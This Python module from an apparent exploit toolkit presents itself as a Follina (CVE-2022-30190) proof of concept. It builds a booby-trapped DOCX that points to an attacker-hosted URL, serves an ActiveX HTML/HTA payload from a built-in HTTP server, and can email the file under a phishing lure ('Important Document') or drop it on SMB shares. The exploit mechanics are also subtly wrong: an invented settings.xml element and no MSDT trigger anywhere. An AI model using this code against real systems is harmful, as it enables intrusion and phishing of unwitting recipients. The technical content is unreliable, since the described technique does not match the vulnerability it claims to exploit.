# File: modules/exploit_lib/cve_2022_30190_follina.py

"""
Follina (Microsoft Office MSDT) PoC:
• Constructs a malicious DOCX that triggers MSDT from an external URL.
• Hosts the HTML/HTA payload on built-in HTTP server.
• Sends the DOCX to the target (via SMB share or emailing).
"""

import zipfile
import shutil
import os
import tempfile
import logging
import http.server
import threading
from pathlib import Path
from bismillah import log_event

logger = logging.getLogger("cve_2022_30190")

HTML_PAYLOAD = """
<html>
<head>
  <script>
    var shell = new ActiveXObject("WScript.Shell");
    shell.Run("calc.exe", 0, false);
  </script>
</head>
<body></body>
</html>
"""

def build_docx_template(docx_path: str, external_url: str):
    """
    Unzip a minimal docx, modify 'word/settings.xml' to include <w:ExternalReference ...>
    pointing to the external URL that hosts the malicious HTML payload.
    """
    tmpdir = tempfile.mkdtemp(prefix="follina_")
    try:
        with zipfile.ZipFile(docx_path, 'r') as zin:
            zin.extractall(tmpdir)
        settings_path = os.path.join(tmpdir, "word", "settings.xml")
        if not os.path.exists(settings_path):
            raise FileNotFoundError("settings.xml not found in DOCX template")
        # Insert ExternalReference
        with open(settings_path, "r", encoding="utf-8") as f:
            content = f.read()
        ext_ref = f"""
<w:settings xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"
            xmlns:w15="http://schemas.microsoft.com/office/word/2012/wordml">
  <w15:externalLink>
    <w15:url>{external_url}</w15:url>
  </w15:externalLink>
</w:settings>
"""
        with open(settings_path, "w", encoding="utf-8") as f:
            f.write(ext_ref)
        # Repack DOCX
        new_docx = f"{Path(docx_path).stem}_exploit.docx"
        with zipfile.ZipFile(new_docx, 'w', zipfile.ZIP_DEFLATED) as zout:
            for root, dirs, files in os.walk(tmpdir):
                for file in files:
                    full = os.path.join(root, file)
                    rel = os.path.relpath(full, tmpdir)
                    zout.write(full, rel)
        return new_docx
    finally:
        shutil.rmtree(tmpdir)

def start_payload_http(port: int = 8000, html_payload: str = None, serve_hta: bool = True):
    """
    Hosts the HTML payload on a simple HTTP server at /payload.html (and /payload.hta if serve_hta).
    Enhanced: supports custom HTML/HTA payloads, logs all requests, and can serve both .html and .hta.
    """
    payload_html = html_payload if html_payload else HTML_PAYLOAD

    class Handler(http.server.SimpleHTTPRequestHandler):
        def do_GET(self):
            if self.path == "/payload.html":
                self.send_response(200)
                self.send_header("Content-type", "text/html")
                self.end_headers()
                self.wfile.write(payload_html.encode())
                logger.info(f"[Follina] Served HTML payload to {self.client_address}")
            elif serve_hta and self.path == "/payload.hta":
                self.send_response(200)
                self.send_header("Content-type", "application/hta")
                self.end_headers()
                self.wfile.write(payload_html.encode())
                logger.info(f"[Follina] Served HTA payload to {self.client_address}")
            else:
                self.send_response(404)
                self.end_headers()
                logger.info(f"[Follina] 404 for {self.path} from {self.client_address}")

    server = http.server.ThreadingHTTPServer(("0.0.0.0", port), Handler)
    logger.info(f"[Follina] Serving payload at http://0.0.0.0:{port}/payload.html (and /payload.hta)")
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    return server

def exploit(target: str, port: int = 8000, docx_template: str = None, html_payload: str = None, serve_hta: bool = True, auto_email: str = None) -> dict:
    """
    1) Starts HTTP payload server on port.
    2) Builds exploit.docx pointing to http://<attacker_ip>:port/payload.html.
    3) Optionally serves /payload.hta for HTA-based Follina.
    4) Optionally sends the DOCX via email (if auto_email is set).
    5) Returns path to crafted DOCX; operator must deliver it to target.
    """
    try:
        if not docx_template or not os.path.exists(docx_template):
            raise ValueError("Valid DOCX template path required")
        attacker_ip = os.getenv("ATTACKER_IP", "192.168.1.10")
        external_url = f"http://{attacker_ip}:{port}/payload.html"
        server = start_payload_http(port, html_payload=html_payload, serve_hta=serve_hta)
        exploit_docx = build_docx_template(docx_template, external_url)
        log_event("cve_2022_30190_follina", f"Built exploit DOCX: {exploit_docx}".encode())
        result = {"status": "ok", "docx": exploit_docx, "payload_url": external_url}
        # Dangerous: optionally auto-email the docx to a target
        if auto_email:
            import smtplib
            from email.message import EmailMessage
            msg = EmailMessage()
            msg["Subject"] = "Important Document"
            msg["From"] = "attacker@example.com"
            msg["To"] = auto_email
            msg.set_content("Please see the attached document.")
            with open(exploit_docx, "rb") as f:
                msg.add_attachment(f.read(), maintype="application", subtype="vnd.openxmlformats-officedocument.wordprocessingml.document", filename=os.path.basename(exploit_docx))
            try:
                smtp = smtplib.SMTP("localhost")
                smtp.send_message(msg)
                smtp.quit()
                logger.info(f"[Follina] Sent exploit DOCX to {auto_email}")
                result["emailed"] = auto_email
            except Exception as e:
                logger.warning(f"[Follina] Failed to email DOCX: {e}")
                result["email_error"] = str(e)
        # Enhancement: optionally auto-drop the docx to a writable SMB share (if configured)
        smb_share = os.getenv("FOLLINA_SMB_SHARE")
        if smb_share:
            try:
                import shutil
                smb_path = os.path.join(smb_share, os.path.basename(exploit_docx))
                shutil.copyfile(exploit_docx, smb_path)
                logger.info(f"[Follina] Dropped exploit DOCX to SMB share: {smb_path}")
                result["smb_drop"] = smb_path
            except Exception as e:
                logger.warning(f"[Follina] Failed to drop DOCX to SMB share: {e}")
                result["smb_error"] = str(e)
        # Enhancement: log the HTTP server thread and exploit docx location for operator
        logger.info(f"[Follina] Exploit ready: {exploit_docx} | Payload URL: {external_url}")
        return result
    except Exception as e:
        logger.error(f"[Follina] Exploit build failed: {e}")
        return {"status": "error", "detail": str(e)}
